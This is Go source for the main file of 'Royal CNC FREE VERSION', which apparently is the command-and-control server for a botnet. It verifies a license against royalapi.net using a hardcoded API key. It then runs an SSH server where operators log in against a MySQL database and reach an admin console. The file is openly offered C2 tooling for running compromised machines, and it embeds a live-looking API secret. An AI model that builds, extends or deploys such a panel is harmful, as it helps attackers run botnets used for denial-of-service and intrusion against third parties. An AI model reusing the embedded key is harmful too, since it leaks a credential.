package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/gliderlabs/ssh"
	"github.com/matthewhartstonge/argon2"
	gossh "golang.org/x/crypto/ssh"
	"golang.org/x/crypto/ssh/terminal"
	"io/ioutil"
	"log"
    "net"
	"net/http"
	"os"
)

var database *Database
var argon argon2.Config

type LicenseResponse struct {
	StatusMsg      string `json:"status_msg"`
	StatusOverview string `json:"status_overview"`
	StatusCode     int    `json:"status_code"`
	StatusID       string `json:"status_id"`
	DiscordID      string `json:"discord_id"`
}

func main() {
	
	log.Println("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;178m Connection to Royal API System ...\u001B[0m")

	// Lecture de la clé de licence depuis la configuration
	licenseKey := config("license")
	product := "cnc"
	apiKey := "G1gje4OBpsAr5gpkqvEgAiRHdumxIGUo"
	apiUrl := "https://royalapi.net/api/client"

	if licenseKey == "" {
		log.Println("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;230m A \u001B[38;5;196m key \u001B[38;5;230m license is \u001B[38;5;196m missing \u001B[38;5;230m in the configuration file. Contact \u001B[38;5;122m @royaloakap \u001B[38;5;230m if you have a problem !")
		os.Exit(1)
	}

	requestData := map[string]string{
		"licensekey": licenseKey,
		"product":    product,
	}
	requestDataJSON, err := json.Marshal(requestData)
	if err != nil {
		log.Println("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;196m Error marshaling request data:", err)
		os.Exit(1)
	}

	req, err := http.NewRequest("POST", apiUrl, bytes.NewBuffer(requestDataJSON))
	if err != nil {
		log.Println("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;196m Error creating HTTP request:", err)
		os.Exit(1)
	}
	req.Header.Set("Authorization", apiKey)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Println("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;196m Error sending HTTPS request:", err)
		os.Exit(1)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Println("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;196m Error reading response body:", err)
		os.Exit(1)
	}

	var licenseData LicenseResponse
	err = json.Unmarshal(body, &licenseData)
	if err != nil {
		log.Println("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;196m Error parsing response body:", err)
		os.Exit(1)
	}

	if licenseData.StatusOverview == "success" {
		log.Println("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;46m Royal CNC FREE VERSION is started and was created by \u001B[38;5;122m ~ Royaloakap ~ \u001B[38;5;46m Your licence\u001B[38;5;230m", licenseKey, "\u001B[38;5;46m is valid.\u001B[38;5;230m")
	} else {
		log.Println("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;196m Your licence\u001B[38;5;230m", licenseKey, "\u001B[38;5;196m is invalid or has reached a ceiling. Contact me on \u001B[38;5;122m discord.gg/RoyalC2 \u001B[38;5;230m or \u001B[38;5;122m @royaloakap.\u001B[38;5;230m")
		log.Println("\u001B[0m\u001B[107m\u001B[38;5;163m[LICENSE]\u001B[0m\u001B[38;5;46m Open a ticket on Discord.gg/RoyalC2\u001B[38;5;230m")
		os.Exit(1)
	}

	// Initialisation de la base de données et de la configuration SSH
	database = NewDatabase(config("mysqlhost"), config("mysqluser"), config("mysqlpassword"), config("mysqldb"))
	argon = argon2.DefaultConfig()
	sshConfig := &ssh.Server{
		Addr:            ":" + config("port"),
		Handler:         sessionHandler,
		PasswordHandler: passwordHandler,
	}
	ipAddr, err := getLocalIP()
	if err != nil {
		log.Println("\u001B[0m\u001B[107m\u001B[38;5;163m[SSH CONNECTION]\u001B[0m\u001B[38;5;196m Error getting local IP address:", err)
		os.Exit(1)
	}
	log.Printf("\u001B[0m\u001B[107m\u001B[38;5;163m[SSH CONNECTION]\u001B[0m\u001B[38;5;46m Starting You'r C2 on\u001B[38;5;200m %s:%s\u001B[0m", ipAddr, config("port"))
	keyParser("ssh/ssh.cat", sshConfig)
	errSsh := sshConfig.ListenAndServe()
	if errSsh != nil {
		log.Fatal(errSsh)
	}
}
func getLocalIP() (string, error) {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "", err
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return localAddr.IP.String(), nil
}
func sessionHandler(session ssh.Session) {
	if database.CheckIfIpExists(session.User()) == false {
		term := terminal.NewTerminal(session, "")
		term.Write([]byte("Please type a new password: "))
		password, _ := term.ReadPassword("")
		term.Write([]byte("Please retype the password: "))
		password2, _ := term.ReadPassword("")
		if password != password2 {
			term.Write([]byte("Passwords do not match ! \n"))
			return
		}
		database.ChangePassword(session.User(), password)
	}
	NewAdmin(session).Handle()
}

func passwordHandler(ctx ssh.Context, password string) bool {
	login, err := database.TryLogin(ctx.User(), password)
	if err != nil {
		log.Println(err)
		return false
	}
	return login
}

func parseAuthorizationKey(file string) (ssh.PublicKey, error) {
	pubKeyBuffer, err := os.ReadFile(file)
	if err != nil {
		return nil, err
	}
	pubKey, _, _, _, err := ssh.ParseAuthorizedKey(pubKeyBuffer)
	if err != nil {
		return nil, err
	}
	return pubKey, nil
}

func keyParser(file string, srv *ssh.Server) {
	pemBytes, err := ioutil.ReadFile(file)
	if err != nil {
		fmt.Println(err)
		return
	}
	hostKey, err := gossh.ParsePrivateKey(pemBytes)
	if err != nil {
		fmt.Println(err)
		return
	}
	srv.AddHostKey(hostKey)
}
